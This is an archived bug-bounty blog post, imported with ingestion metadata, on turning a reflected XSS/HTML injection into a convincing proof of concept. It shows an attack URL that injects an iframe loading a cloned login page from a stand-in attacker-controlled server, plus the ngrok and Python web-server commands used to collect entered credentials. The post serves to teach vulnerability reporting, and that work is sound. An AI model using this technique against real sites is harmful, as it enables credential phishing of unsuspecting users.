---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-08-30_htmlixss-crafting-a-better-poc.md
original_filename: 2022-08-30_htmlixss-crafting-a-better-poc.md
title: HTMLI/XSS - Crafting a better PoC
category: documents
detected_topics:
- xss
- command-injection
- api-security
tags:
- imported
- documents
- xss
- command-injection
- api-security
language: en
raw_sha256: 2a05079e68baacf2252387611446a513620045ede8580afdf3650d7171883af2
text_sha256: 4ac09f4248a0bc6259f466ea48dabe1bea3d6edfe562c1121cae39e63b67d0e0
ingested_at: '2026-06-28T07:32:13Z'
sensitivity: unknown
redactions_applied: false
---

# HTMLI/XSS - Crafting a better PoC

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-08-30_htmlixss-crafting-a-better-poc.md
- Source Type: markdown
- Detected Topics: xss, command-injection, api-security
- Ingested At: 2026-06-28T07:32:13Z
- Redactions Applied: False
- Raw SHA256: `2a05079e68baacf2252387611446a513620045ede8580afdf3650d7171883af2`
- Text SHA256: `4ac09f4248a0bc6259f466ea48dabe1bea3d6edfe562c1121cae39e63b67d0e0`


## Content

---
title: "HTMLI/XSS - Crafting a better PoC"
url: "https://blog.riotsecurityteam.com/xsshtmli-crafting-better-pocs"
final_url: "https://blog.riotsecurityteam.com/xsshtmli-crafting-better-pocs/"
authors: ["RiotSecurityTeam (@RiotSecTeam)"]
bugs: ["XSS", "HTML injection"]
publication_date: "2022-08-30"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2237
---

# HTMLI/XSS - Crafting a better PoC

[![](data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjIwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2ZXJzaW9uPSIxLjEiLz4=)![RiotSecurityTeam's photo](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7)](https://hashnode.com/@RiotSecurityTeam)

[RiotSecurityTeam](https://hashnode.com/@RiotSecurityTeam)

·[Aug 30, 2022](https://blog.riotsecurityteam.com/xsshtmli-crafting-better-pocs)·

2 min read

In today's blog I am going to talk about a recent bug bounty / security audit I did for an external company. I have worked with the company in the past pwning their JIRA Instances, main Web Application and even getting internal data so I knew the platform pretty well. 

I found an unauthenticated HTMLI/RXSS Vulnerability on a particular endpoint. Cookies were setup securely so I wasn't able to perform cookie hijacking, I possibly could've performed OSRF via RXSS, if you'd be interested in learning such leverages you can purchase a module which covers leveraging XSS to all sorts of vulnerabilities from the [HackTheBox Academy](https://academy.hackthebox.com/)

A simple leverage for larger Web Applications would be having to utilise the `<iframe>` tag. Note, some protections may be in place to prevent `<iframe>` injection/iframing in general. 

The idea? We firstly clone to authentication page for the domain we've found the XSS/HTMLI on. Once we've done that we can host it somewhere maybe a VPS, NGROK etc - in my case I used NGROK to bounce to localhost:1337 and then started a python web server on port 1337. Note: Depending on the Web Application you may have to write some additional code to send the creds from the input fields to the server.

Attackers URL:

`https://redacted.com/search?q=<iframe width="width" height="height" src="http://attacker-controlled-server.com/redacted-xss-poc.html"></iframe>`

To determine the height and or width just constantly change it, you'll get it on the third go a majority of the time.

Upon visiting the attackers URL you'll see something like:

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1661859205044/4IhrIpXng.png?auto=compress,format&format=webp)

After entering the creds etc, check the python web server:

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1661859401766/iqYef8I2i.png?auto=compress,format&format=webp)

Configuration:

`./ngrok http 1337` `python3 -m http.server 1337`

Ensure the `.html` or `.php` file is in the working directory that you start the web server in for indexing. 

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1661859735747/A65b6qPos.png?auto=compress,format&format=webp)

Record your PoC and write your report. It will be a lot more beneficial for you to show a PoC other than alert(1) - Also, always do alert(document.domain) to ensure you're not in a sandboxed environment. 

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1661860047747/pVhN9AaDOX.png?auto=compress,format&format=webp)

Unfortunately I am unable to go as in-depth as I had hoped for. Nether the less, I hope you enjoyed and learned something or just a new idea/technique to use in future reports.

Like

[](https://twitter.com/share?url=https%3A%2F%2Fblog.riotsecurityteam.com%2Fxsshtmli-crafting-better-pocs&text=HTMLI%2FXSS%20-%20Crafting%20a%20better%20PoC%0D%0A%7B%20by%20%40RiotSecTeam%20%7D%20from%20%40hashnode%0D%0A)

Share this[](https://twitter.com/share?url=https%3A%2F%2Fblog.riotsecurityteam.com%2Fxsshtmli-crafting-better-pocs&text=%20%40RiotSecurityTeam)[](http://www.reddit.com/submit?title=HTMLI%2FXSS%20-%20Crafting%20a%20better%20PoC&selftext=true&text=%20https%3A%2F%2Fblog.riotsecurityteam.com%2Fxsshtmli-crafting-better-pocs)
